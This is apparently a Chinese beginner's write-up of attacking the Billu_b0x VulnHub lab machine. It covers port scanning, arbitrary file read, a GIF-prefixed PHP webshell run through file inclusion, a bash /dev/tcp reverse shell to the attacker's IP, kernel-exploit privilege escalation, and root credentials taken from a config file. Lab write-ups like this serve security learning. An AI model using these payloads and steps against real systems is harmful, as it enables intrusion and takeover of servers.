+++
title = 'Billu_b0x打靶记录'
date = '2023-11-26T14:39:00+08:00'
categories = ['vulnhub']
tags = ['安全', '打靶记录']
+++

## 前言

最近有点迷茫，尝试一下学长推荐的一个经典的靶机。ps:第一次打靶机。

## 准备

这里下载靶机镜像：[billu: b0x ~ VulnHub](https://vulnhub.com/entry/billu-b0x,188/)
导入创建靶机后，将网络设置为nat模式，和kali在同一个网段。
网段:192.168.26.0/24
kali：192.168.26.26
网关: 192.168.26.2

![image-20231126184619521](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311261846604.png)

## 开始

### 信息收集

##### 先找出靶机的ip

```php
nmap -sP 192.168.26.0/24
```

![image-20231126185145277](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311261851315.png)

这个192.168.26.133应该就是靶机的ip了。

##### 端口扫描

```php
nmap --min-rate 10000 -p- 192.168.26.133#以最低速率 1w进行端口扫描 -p- 表示扫描所有端口
nmap --min-rate 10000 -p 1-65535  192.168.26.133 #一样效果
```

![image-20231126190408396](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311261904435.png)

可以看到这里开放了22 ssh，和80 http服务。后面可以尝试ssh爆破。
这里先访问www服务看看。
![image-20231126190703977](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311261907116.png)

这里看到一个登录框，可以存在sql注入漏洞。但是尝试了，并没有发现注入漏洞。

##### 扫目录

看一下 后台都有什么文件
![image-20231126191234235](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311261912281.png)

可以看到还是有很多的文件的，我们逐个访问测试

### 解题过程

add.php
![image-20231126191424071](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311261914103.png)

一个上传文件的页面，尝试，发现没有返回

head.php
![image-20231126191809327](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311261918530.png)

主页面的背景图片。

in

![image-20231126191944310](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311261919349.png)

in下可以看到phpinfo的信息。php版本：5.3.10 系统：乌班图

网站路径：
![image-20231126200909137](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311262009171.png)

phpmy
![image-20231126192117871](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311261921933.png)

phpmyadmin数据库工具。

show.php 没看到东西。

c   没看到东西

panel.php 一个跳转的页面

test.php
![image-20231126192634922](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311261926954.png)

这里提示 file参数为空。
![image-20231126192730559](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311261927604.png)

这里发现，我们传递的参数文件可以进行下载。经过测试可以任意文件读取。

这里总结一下

```php
index.php 一个登录页面
add.php   文件上传页面
in        phpinfo信息
phpmy     phpmyadmin数据库工具
test.php  文件下载
panel.php 一个跳转的页面
show.php  没看到东西。
```

到这里我们可以利用test.php 将其他的文件下载下来进行分析。

test.php
![image-20231126194923481](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311261949552.png)

将我们传递的file参数，当做文件，进行任意下载。

c.php

```php
<?php
#header( 'Z-Powered-By:its chutiyapa xD' );
header('X-Frame-Options: SAMEORIGIN');
header( 'Server:testing only' );
header( 'X-Powered-By:testing only' );

ini_set( 'session.cookie_httponly', 1 );

$conn = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab");
#存储数据库连接的句柄（handle）。通过此句柄，你可以执行与数据库有关的操作，比如查询。

// Check connection
if (mysqli_connect_errno())
  {
  echo "connection failed ->  " . mysqli_connect_error();
  }
?>
```

这里发现了数据库的账号和密码。

show.php

```php
<?php
include('c.php');#

if(isset($_POST['continue']))
{
	$run='select * from users ';
	$result = mysqli_query($conn, $run); #从users中查询所有的数据
if (mysqli_num_rows($result) > 0) {#判断查询出的 数据数量
echo "<table width=90% ><tr><td>ID</td><td>User</td><td>Address</td><td>Image</td></tr>";
 while($row = mysqli_fetch_assoc($result)) 
   {
	   echo '<tr><td>'.$row['id'].'</td><td>'.htmlspecialchars ($row['name'],ENT_COMPAT).'</td><td>'.htmlspecialchars ($row['address'],ENT_COMPAT).'</td><td><img src="uploaded_images/'.htmlspecialchars ($row['image'],ENT_COMPAT).'" height=90px width=100px></td></tr>';
}
   echo "</table>";
}
}

?>
```

大概就是查询数据，然后显示出来。

panel.php

```php
<?php
session_start();

include('c.php');
include('head2.php');
if(@$_SESSION['logged']!=true )//如果没有登录 跳转到index.php
{
		header('Location: index.php', true, 302);
		exit();
	
}



echo "Welcome to billu b0x ";
echo '<form method=post style="margin: 10px 0px 10px 95%;"><input type=submit name=lg value=Logout></form>';
if(isset($_POST['lg']))#销毁会话
{
	unset($_SESSION['logged']);
	unset($_SESSION['admin']);
	header('Location: index.php', true, 302);
}
echo '<hr><br>';

echo '<form method=post>

<select name=load>
    <option value="show">Show Users</option>
	<option value="add">Add User</option>
</select> 

 &nbsp<input type=submit name=continue value="continue"></form><br><br>';
if(isset($_POST['continue']))
{
	$dir=getcwd();#h获取当前目录
	$choice=str_replace('./','',$_POST['load']);#
	
	if($choice==='add')
	{
       		include($dir.'/'.$choice.'.php');#文件包含
			die();
	}
	
        if($choice==='show')
	{
        
		include($dir.'/'.$choice.'.php');
		die();
	}
	else
	{
		include($dir.'/'.$_POST['load']);
	}
	
}

#文件上传
if(isset($_POST['upload']))
{
	
	$name=mysqli_real_escape_string($conn,$_POST['name']);
	$address=mysqli_real_escape_string($conn,$_POST['address']);
	$id=mysqli_real_escape_string($conn,$_POST['id']);
	
	if(!empty($_FILES['image']['name']))
	{
		$iname=mysqli_real_escape_string($conn,$_FILES['image']['name']);
	$r=pathinfo($_FILES['image']['name'],PATHINFO_EXTENSION);
	$image=array('jpeg','jpg','gif','png');
	if(in_array($r,$image))
	{
		$finfo = @new finfo(FILEINFO_MIME); 
	$filetype = @$finfo->file($_FILES['image']['tmp_name']);
		if(preg_match('/image\/jpeg/',$filetype )  || preg_match('/image\/png/',$filetype ) || preg_match('/image\/gif/',$filetype ))
				{
					if (move_uploaded_file($_FILES['image']['tmp_name'], 'uploaded_images/'.$_FILES['image']['name']))
							 {
							  echo "Uploaded successfully ";
							  $update='insert into users(name,address,image,id) values(\''.$name.'\',\''.$address.'\',\''.$iname.'\', \''.$id.'\')'; 
							 mysqli_query($conn, $update);
							  
							}
				}
			else
			{
				echo "<br>i told you dear, only png,jpg and gif file are allowed";
			}
	}
	else
	{
		echo "<br>only png,jpg and gif file are allowed";
	}
}
}
?>
```

这个文件实现了文件上传和文件包含，前面我们拿到了数据库的账号和密码，我们登录账号，然后通过上传图片马，然后通过文件包含触发图片马，这里测试一下。

billu：b0x_billu

登录phpmy
![image-20231126202306957](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311262023040.png)

![image-20231126202526611](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311262025656.png)

这里查询出来一个用户，应该就是主页登录的用户。
ok，登录成功，按照index.php的逻辑现在就要跳到，panel.php页面
![image-20231126202650335](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311262026455.png)

这边可以显示上传的照片还能上传文件。
![image-20231126202739628](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311262027763.png)

发现只能上传图片。
上面我们也说了，这个php文件中存在一个文件包含，我们可以上传一个图片马，然后通过文件包含进行解析。

![image-20231126203106457](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311262031492.png)

![image-20231126203151901](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311262031973.png)

上传成功。我们查看一下。

![image-20231126203223082](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311262032411.png)

此时是没有解析的，这就要用到文件包含了。

![image-20231126203343795](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311262033833.png)

我们去构造load

![image-20231126203628276](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311262036348.png)

这里已经成功执行了。

![image-20231126203750563](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311262037595.png)

但是这里并不是root权限。


## 提权

#### 第一种:

反弹一个低权限shell
构建shell反弹出来

```php
echo "bash -i >& /dev/tcp/192.168.26.26/6666 0>&1" | bash
```

这里要进行url编码。

这里把图片马换成 （上面那个套上system也反弹不了 不知道为什么）

```
GIF89a
<?php system($_GET[a]);?>
```

![image-20231126210029375](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311262100455.png)

这边已经反弹过来了。

查看系统内核版本
![image-20231126210626063](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311262106099.png)

这里通过溢出提权
exp:[Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation - Linux local Exploit (exploit-db.com)](https://www.exploit-db.com/exploits/37292)

现在要将exp上传上去
![image-20231126211209295](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311262112339.png)

这里注意这个目录是有写入的权限的，我们去写一个马
![image-20231126212602392](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311262126448.png)

蚁剑连接
![image-20231126212629138](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311262126190.png)

将exp上传

![image-20231126212832985](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311262128046.png)

编译执行，提权成功。

#### 第二种

我们前面知道了网站的根目录，而且test.php可以任意文件下载。通过下载phpmyadmin的配置文件获取root密码
![image-20231126213051495](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311262130567.png)

这里就能看到root用户密码了，ssh登录。

![image-20231126213225865](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202311262132926.png)

## 总结

第一次打靶机，虽然不是独立完成，但还是有很多收获的。